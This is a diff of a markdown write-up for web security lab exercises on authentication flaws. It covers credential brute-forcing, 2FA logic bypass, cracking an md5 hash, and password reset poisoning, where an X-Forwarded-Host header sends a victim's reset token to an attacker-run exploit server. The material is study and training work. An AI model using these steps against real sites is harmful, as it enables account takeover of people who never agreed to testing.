@@ -103,7 +103,7 @@ username=accounting&password=§bla§
 It seems that the lock has no effect if the real credentials are supplied.
 The answer with the smallest response contains the valid credentials.
 
-![no-lock](img/no-lock.png)
+![no-lock](images/no-lock.png)
 
 ## 2FA broken logic
 
@@ -144,8 +144,11 @@ Use <https://crackstation.net/> to check the hash.  --> `onceuponatime` (md5)
 In this lab we can manipulate the `X-Forwarded-Host` header to generate password 
 reset links for a host we control.
 
-1. Repeater for the `POST /forgot-password` request
-1. set username to carlos
-1. add `X-Forwarded-Host: exploit-0a2f00cd041f7e3f823151b001690060.exploit-server.net/exploit`
-1. Access the server log
-      `GET /exploit/forgot-password?temp-forgot-password-token=SOEFGdL2dqdeCXu0xrqN2ndOQwXSGwnp HTTP/1.1`
+1. Use Repeater for the `POST /forgot-password` request
+1. Set username to carlos
+1. Add `X-Forwarded-Host: exploit-0a2f00cd041f7e3f823151b001690060.exploit-server.net/exploit` Header
+1. Access the server log:
+        `GET /exploit/forgot-password?temp-forgot-password-token=SOEFGdL2dqdeCXu0xrqN2ndOQwXSGwnp HTTP/1.1`
+
+## Password brute-force via password change
+
